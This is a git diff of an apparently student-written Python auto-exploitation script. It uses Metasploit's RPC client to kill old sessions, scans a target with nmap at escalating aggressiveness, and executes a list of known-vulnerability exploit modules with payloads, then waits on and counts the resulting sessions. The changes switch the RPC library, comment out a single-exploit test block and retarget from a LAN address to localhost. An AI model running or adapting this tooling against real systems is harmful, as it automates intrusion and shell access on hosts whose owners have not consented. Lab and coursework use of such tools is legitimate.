@@ -2,14 +2,17 @@
 # which has a vulnerability, and then it exploits that
 # NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY
 
-from pymetasploit3.msfrpc import *
 import time
-import utils
 import sys
+import os
+sys.path.append(os.getcwd() + "/lib/")
+from lib.msfrpc4 import *
 import nmap_dest
 import re
 import subprocess
 from knownVulnerabilities import vulnerabilities
+
+
 
 if __name__ == "__main__":
     #############################################################################
@@ -22,39 +25,41 @@ if __name__ == "__main__":
 
     # basically starts metasploit and kill all previous sessions 
     client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
+    print(client.jobs.list)
     for k in client.sessions.list.keys():
         client.sessions.session(str(k)).stop()
-    print("session list =", client.sessions.list)
+    print("JOBS (should be empty)", "session list =", client.sessions.list)
 
     ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
     # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
-    vulnerability = vulnerabilities[3]
-    print(vulnerability.description)
-    print(vulnerability.module)
-    RHOSTS = "192.168.1.162" # PUT YOUR HOST HERE
-    module = vulnerability.module
-    exploit = client.modules.use(vulnerability.exploitType, module)
-    print(exploit)
-    # options = exploit.options
-    missingOptions = exploit.missing_required
-    if 'RHOSTS' in missingOptions:
-        print(RHOSTS)
-        exploit['RHOSTS'] = RHOSTS
-    print("missing options:", exploit.missing_required)
-    if vulnerability.payload:
-        print("payload:", vulnerability.payload)
-        exploit.execute(payload=vulnerability.payload)
-    else:
-        print("no payload")
-        exploit.execute()
-    time.sleep(vulnerability.sleep)
-    print(client.sessions.list)
-    exit()
+    # vulnerability = vulnerabilities[3]
+    # print(vulnerability.description)
+    # print(vulnerability.module)
+    # RHOSTS = "192.168.1.162" # PUT YOUR HOST HERE
+    # module = vulnerability.module
+    # exploit = client.modules.use(vulnerability.exploitType, module)
+    # print(exploit)
+    # # options = exploit.options
+    # missingOptions = exploit.missing_required
+    # if 'RHOSTS' in missingOptions:
+    #     print(RHOSTS)
+    #     exploit['RHOSTS'] = RHOSTS
+    # print("missing options:", exploit.missing_required)
+    # if vulnerability.payload:
+    #     print("payload:", vulnerability.payload)
+    #     exploit.execute(payload=vulnerability.payload)
+    # else:
+    #     print("no payload")
+    #     exploit.execute()
+    # print("JOBS (shouldn't be empty)", client.jobs.list)
+    # time.sleep(vulnerability.sleep)
+    # print(client.sessions.list)
+    # exit()
     ######### TEST
 
     ######## RECONAISSANCE PHASE ########
-    RHOSTS = "192.168.1.162"
-    nmapAggressiveness = 2
+    RHOSTS = "127.0.0.1"
+    nmapAggressiveness = 1
     # in order of increasing levels of fucking around (and also in increasing levels of finding out)
     nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
     nmapArgs = nmapPossibleArgs[nmapAggressiveness]
@@ -103,7 +108,7 @@ if __name__ == "__main__":
             exploit.execute(payload=vulnerability.payload)
         else:
             exploit.execute()
-        time.sleep(vulnerability.sleep)
+        # time.sleep(vulnerability.sleep)
         numSessions = 0
         for k in client.sessions.list.keys():
             numSessions += 1
@@ -112,6 +117,10 @@ if __name__ == "__main__":
         # for _session in client.sessions.list.keys():
         #     break
     
+    while(client.sessions.list):
+        time.sleep(10)
+        print(client.sessions.list)
+
     ####### Print some info on the sessions created
     print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
     sessions = client.sessions.list
